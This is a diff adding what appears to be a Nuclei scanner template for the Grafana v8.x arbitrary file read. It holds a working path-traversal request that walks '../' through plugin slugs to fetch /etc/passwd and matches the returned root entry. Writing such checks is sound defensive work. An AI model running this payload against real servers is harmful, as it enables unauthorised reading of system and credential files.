@@ -1,0 +1,27 @@
+id: grafana-file-read
+info:
+  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0
+  name: Grafana v8.x Arbitrary File Read
+  reference:
+  - https://nosec.org/home/detail/4914.html
+  - https://github.com/jas502n/Grafana-VulnTips
+  - hhttps://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
+  - https://twitter.com/naglinagli/status/1468155313182416899
+  severity: high
+  tags: grafana,lfi,fuzz
+requests:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd'
+  payloads:
+    pluginSlug: helpers/wordlists/grafana-plugins.txt
+  stop-at-first-match: true
+  threads: 50
